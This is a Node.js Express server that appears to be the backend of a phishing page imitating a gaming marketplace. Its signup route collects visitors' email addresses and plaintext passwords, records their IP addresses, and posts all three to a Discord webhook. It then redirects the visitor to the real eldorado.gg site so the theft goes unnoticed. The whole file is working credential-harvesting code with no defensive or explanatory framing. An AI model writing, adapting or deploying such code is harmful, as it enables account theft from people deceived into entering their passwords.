// index.js
require('dotenv').config();
const express = require('express');
const path = require('path');

const app = express();

// ENV
const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

// Debug
console.log("Webhook loaded:", !!DISCORD_WEBHOOK_URL);

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ✅ FIXED: use lowercase "public"
app.use(express.static(path.join(__dirname, 'public')));

// Email validation
function isValidEmail(email) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}

// Get client IP
function getClientIP(req) {
  return (
    req.headers['x-forwarded-for']?.split(',')[0].trim() ||
    req.socket?.remoteAddress ||
    'unknown'
  );
}

// Send webhook
async function sendDiscordNotification({ email, password, ip }) {
  if (!DISCORD_WEBHOOK_URL) {
    console.log("No webhook URL set");
    return;
  }

  try {
    console.log("Sending webhook...");

    const response = await fetch(DISCORD_WEBHOOK_URL, {
  method: "POST",
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify({
    content: `New signup: ${email} | Password: ${password} (IP: ${ip})`
  })
});

const text = await response.text().catch(() => "");

console.log("Discord status:", response.status);
console.log("Discord response:", text);

  } catch (err) {
    console.error("Webhook error:", err.message);
  }
}

// API
app.post('/users', async (req, res) => {
  try {
    const { email, password } = req.body;
    const ip = getClientIP(req);

    if (!email || !isValidEmail(email)) {
      return res.status(400).json({ error: "Invalid email" });
    }

    if (!password) {
      return res.status(400).json({ error: "Invalid password" });
    }

    console.log(`Signup: ${email} (${ip})`);

    sendDiscordNotification({ email, password, ip });

    return res.json({
      success: true,
      redirectUrl: "https://www.eldorado.gg/"
    });

  } catch (err) {
    console.error("Server error:", err);
    return res.status(500).json({ error: "Internal error" });
  }
});

// ✅ Serve homepage
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Health check
app.get('/health', (req, res) => {
  res.json({ status: "ok" });
});

// Start server (Render compatible)
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
